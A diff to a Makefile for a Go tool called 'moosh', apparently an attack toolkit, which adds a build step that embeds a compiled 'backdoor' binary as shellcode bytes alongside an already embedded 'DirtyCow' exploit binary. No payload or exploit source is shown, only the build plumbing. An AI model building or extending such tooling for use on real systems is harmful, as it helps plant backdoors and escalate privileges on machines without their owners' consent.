@@ -29,7 +29,14 @@ cmd/moosh/cow.go: $(BINDIR)/cow
 	@printf "package main\n\nvar DirtyCow = []byte{$(shell cat $(BINDIR)/cow | xxd -i)}" > cmd/moosh/cow.go
 	@gofmt -w -s ./cmd/moosh/cow.go
 
-$(BINDIR)/moosh: cmd/moosh/cow.go cmd/moosh/moosh.go vendor
+cmd/moosh/backdoor.go: $(BINDIR)/backdoor
+	@echo "Generating shellcode..."
+	@echo 'package main\n\nvar Backdoor = []byte{' > cmd/moosh/backdoor.go
+	@cat $(BINDIR)/backdoor | xxd -i | head -c -1 >> cmd/moosh/backdoor.go
+	@echo ',\n}\n' >> cmd/moosh/backdoor.go
+	@gofmt -w -s ./cmd/moosh/backdoor.go
+
+$(BINDIR)/moosh: cmd/moosh/cow.go cmd/moosh/backdoor.go cmd/moosh/moosh.go vendor
 	@echo "Compiling moosh..."
 	@CGO_ENABLED=0 GOARCH=amd64 go build -o $(BINDIR)/moosh ./cmd/moosh
 
@@ -51,7 +58,7 @@ hhttpd: $(BINDIR)/hhttpd
 cow: cmd/moosh/cow.go
 
 clean:
-	rm -rf $(BINDIR)/{backdoor,moosh,mooshy,cow,hhttpd} cmd/moosh/cow.go vendor
+	rm -rf $(BINDIR)/{backdoor,moosh,mooshy,cow,hhttpd} cmd/moosh/cow.go cmd/moosh/backdoor.go vendor
 
 .SECONDARY: $(BINDIR)/cow
 .PHONY: all deps mooshy moosh fmt cow clean backdoor hhttpd
